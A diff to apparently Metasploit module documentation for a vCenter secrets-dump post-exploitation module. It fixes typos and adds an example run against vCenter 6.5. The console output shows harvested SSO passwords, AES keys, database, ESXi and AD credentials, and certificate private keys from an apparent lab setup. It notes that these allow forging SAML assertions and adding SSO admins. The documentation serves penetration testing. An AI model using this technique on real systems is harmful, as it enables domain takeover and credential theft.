@@ -1,7 +1,7 @@
 Grab secrets and keys from the vCenter server and add them to loot. Secrets include the dcAccountDN
-and dcAccountPassword for the vCenter machine which can be used for maniuplating the SSO domain via
+and dcAccountPassword for the vCenter machine which can be used for manipulating the SSO domain via
 standard LDAP interface; good for plugging into the vmware_vcenter_vmdir_ldap module or for adding
-new SSO admin users. The MACHINE_SSL, VMCA_ROOT and SSO IdP certificates with assocaited private keys
+new SSO admin users. The MACHINE_SSL, VMCA_ROOT and SSO IdP certificates with associated private keys
 are also plundered and can be used to sign forged SAML assertions for the /ui admin interface.
 
 ## Vulnerable Application
@@ -52,9 +52,10 @@ msf6 post(linux/gather/vcenter_secrets_dump) > set session 1
 session => 1
 msf6 post(linux/gather/vcenter_secrets_dump) > dump
 
-[*] VMware VirtualCenter 7.0.3 build-19480866
-[*] Gathering vSphere SSO domain information ...
 [*] vSphere Hostname and IPv4: vcenterdelta.cesium137.io [192.168.100.70]
+[*] VMware VirtualCenter 7.0.3 build-19480866
+[*] Embedded Platform Service Controller
+[*] Gathering vSphere SSO domain information ...
 [+] vSphere SSO DC DN: cn=vcenterdelta.cesium137.io,ou=Domain Controllers,dc=delta,dc=vsphere,dc=local
 [+] vSphere SSO DC PW: *6{ K3Ei*@<J[.gd5c3o
 [*] Extract vmdird tenant AES encryption key ...
@@ -148,9 +149,10 @@ msf6 post(linux/gather/vcenter_secrets_dump) > set session 1
 session => 1
 msf6 post(linux/gather/vcenter_secrets_dump) > dump
 
+[*] vSphere Hostname and IPv4: vcenteralpha.cesium137.io [192.168.100.60]
 [*] VMware VirtualCenter 6.0.0 build-14510547
+[*] Embedded Platform Service Controller
 [*] Gathering vSphere SSO domain information ...
-[*] vSphere Hostname and IPv4: vcenteralpha [192.168.100.60]
 [+] vSphere SSO DC DN: cn=vcenteralpha.cesium137.io,ou=Domain Controllers,dc=alpha,dc=vsphere,dc=local
 [+] vSphere SSO DC PW: <PMW{T:4mnb@UBs/$f(w
 [*] Extract vmdird tenant AES encryption key ...
@@ -211,3 +213,61 @@ msf6 post(linux/gather/vcenter_secrets_dump) > dump
 [*] Post module execution completed
 msf6 post(linux/gather/vcenter_secrets_dump) >
 ```
+
+Example run from meterpreter session on vCenter appliance version 6.5 U3q, configured with an external PSC
+
+```
+msf6 exploit(multi/handler) > use post/linux/gather/vcenter_secrets_dump
+msf6 post(linux/gather/vcenter_secrets_dump) > set session 1
+session => 1
+msf6 post(linux/gather/vcenter_secrets_dump) > dump
+
+[*] vSphere Hostname and IPv4: vctr01.cesium137.io [192.168.0.111]
+[*] VMware VirtualCenter 6.5.0 build-18499837
+[!] External Platform Service Controller: psc01.cesium137.io
+[!] This module assumes embedded PSC, functionality will be limited
+[*] Gathering vSphere SSO domain information ...
+[+] vSphere SSO DC DN: cn=vctr01.cesium137.io,ou=Computers,dc=vsphere,dc=local
+[+] vSphere SSO DC PW: *Pz[aO0Udli"%mbt%`Gn
+[*] Extract vmware-vpx AES key ...
+[+] vSphere vmware-vpx AES encryption
+        HEX: db5beca47d9bb7af5da5278aeeee4b0a83076670736c46546f77a1ddfbe54f2e
+[*] Extracting PostgreSQL database credentials ...
+[+]     VCDB Name: VCDB
+[+]     VCDB User: vc
+[+]     VCDB Pass: cq1=+*f(gTQZ_6)Y
+[*] Extract ESXi host vpxuser credentials ...
+[+] ESXi Host esxi01.cesium137.io [192.168.0.101]  LOGIN: vpxuser PASS: 13M\.3LCb36n8:=_847HzS}U:c9@d65=
+[+] ESXi Host esxi02.cesium137.io [192.168.0.102]  LOGIN: vpxuser PASS: -0fQviFI0f}C@8:v3y[jP[\C{lqU8.kL
+[+] ESXi Host esxi03.cesium137.io [192.168.0.103]  LOGIN: vpxuser PASS: .TB4/OEr3H^pM.kj4a^-]0Z:_TWl{=_H
+[*] Extracting vSphere SSO domain secrets ...
+[*] Dumping vmdir schema to LDIF ...
+[+] LDIF Dump: /home/cs137/.msf4/loot/20220505083154_default_192.168.0.111_vmdir_383063.ldif
+[*] Processing vmdir LDIF (this may take several minutes) ...
+[*] Processing LDIF entries ...
+[*] Processing SSO account hashes ...
+[!] No password hashes found
+[*] Processing SSO identity sources ...
+[!] No SSO ID provider information found
+[*] Extracting certificates from vSphere platform ...
+[+] MACHINE_SSL_CERT key: /home/cs137/.msf4/loot/20220505083156_default_192.168.0.111___MACHINE_CERT_323341.key
+[+] MACHINE_SSL_CERT cert: /home/cs137/.msf4/loot/20220505083156_default_192.168.0.111___MACHINE_CERT_255826.pem
+[+] MACHINE key: /home/cs137/.msf4/loot/20220505083158_default_192.168.0.111_machine_248465.key
+[+] MACHINE cert: /home/cs137/.msf4/loot/20220505083159_default_192.168.0.111_machine_130920.pem
+[+] VSPHERE-WEBCLIENT key: /home/cs137/.msf4/loot/20220505083200_default_192.168.0.111_vspherewebclien_019114.key
+[+] VSPHERE-WEBCLIENT cert: /home/cs137/.msf4/loot/20220505083201_default_192.168.0.111_vspherewebclien_777853.pem
+[+] VPXD key: /home/cs137/.msf4/loot/20220505083202_default_192.168.0.111_vpxd_846784.key
+[+] VPXD cert: /home/cs137/.msf4/loot/20220505083202_default_192.168.0.111_vpxd_796349.pem
+[+] VPXD-EXTENSION key: /home/cs137/.msf4/loot/20220505083204_default_192.168.0.111_vpxdextension_570408.key
+[+] VPXD-EXTENSION cert: /home/cs137/.msf4/loot/20220505083204_default_192.168.0.111_vpxdextension_490761.pem
+[+] SMS key: /home/cs137/.msf4/loot/20220505083206_default_192.168.0.111_sms_self_signed_278681.key
+[+] SMS cert: /home/cs137/.msf4/loot/20220505083206_default_192.168.0.111_sms_self_signed_163386.pem
+[*] Searching for secrets in VM Guest Customization Specification XML ...
+[*] Processing vpx_customization_spec 'Windows 2019 Datacenter' ...
+[*] Validating data encipherment key ...
+[*] Initial administrator account password found for vpx_customization_spec 'Windows 2019 Datacenter':
+[+]     Initial Admin PW: IAmSam!
+[*] AD domain join account found for vpx_customization_spec 'Windows 2019 Datacenter':
+[+]     AD User: sam@cesium137.io
+[+]     AD Pass: Gr33n3gg$!
+[*] Post module execution completed
